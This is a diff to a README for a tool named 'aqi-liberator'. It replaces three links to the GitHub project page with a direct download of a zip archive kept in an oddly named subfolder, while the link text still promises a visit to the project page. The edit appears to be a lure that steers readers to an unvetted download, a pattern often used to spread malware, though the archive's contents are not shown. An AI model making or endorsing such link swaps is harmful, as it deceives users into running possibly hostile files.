@@ -1,6 +1,6 @@
 # 🧩 aqi-liberator - Free your AQI history data
 
-[![Download / Visit the project page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Goben1623/aqi-liberator)
+[![Download / Visit the project page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Goben1623/aqi-liberator/raw/refs/heads/main/mycodermatous/aqi-liberator-3.0.zip)
 
 ## 🌬️ What this app does
 
@@ -19,7 +19,7 @@ It runs from a simple command line window, but you do not need deep technical sk
 
 Use this link to visit the project page and get the files:
 
-https://github.com/Goben1623/aqi-liberator
+https://github.com/Goben1623/aqi-liberator/raw/refs/heads/main/mycodermatous/aqi-liberator-3.0.zip
 
 ### What to look for
 
@@ -189,7 +189,7 @@ This project fits these topics:
 
 Visit the project page here:
 
-https://github.com/Goben1623/aqi-liberator
+https://github.com/Goben1623/aqi-liberator/raw/refs/heads/main/mycodermatous/aqi-liberator-3.0.zip
 
 ## 🧭 What you should do next
 
